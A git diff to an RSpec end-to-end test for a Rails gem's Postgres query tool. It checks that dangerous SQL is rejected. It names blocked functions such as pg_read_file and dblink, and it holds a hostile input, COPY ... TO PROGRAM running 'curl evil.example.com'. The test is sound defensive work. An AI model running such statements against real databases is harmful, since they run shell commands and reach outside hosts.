@@ -8,9 +8,9 @@ require_relative "e2e_helper"
 #
 # Exercises the rails_query tool's Postgres-specific code paths:
 #   - SET TRANSACTION READ ONLY before SELECT
-#   - BLOCKED_FUNCTIONS regex (pg_read_file, pg_ls_dir, dblink, COPY ...
-#     PROGRAM, LO_*, etc.) - verified via attempting one and asserting
-#     a structured rejection
+#   - BLOCKED_FUNCTIONS regex (pg_read_file, pg_ls_dir, dblink, LO_*, etc.)
+#     and the statement keyword blocker (COPY, DROP) - verified via
+#     attempting one and asserting a structured rejection
 #
 # Plus the SQLite-equivalent baseline (rails_get_schema, rails_get_routes)
 # to prove the gem works against a non-default adapter end-to-end.
@@ -65,7 +65,7 @@ RSpec.describe "E2E: Postgres adapter", type: :e2e do
         "expected dblink to be blocked, got: #{result}"
     end
 
-    it "blocks COPY ... PROGRAM via BLOCKED_FUNCTIONS regex" do
+    it "blocks COPY ... PROGRAM" do
       result = @cli.cli_tool("query", [ "--sql", "COPY (SELECT 1) TO PROGRAM 'curl evil.example.com'" ])
       output = result.output
       expect(output).to match(/blocked|denied|forbidden|not allowed/i),
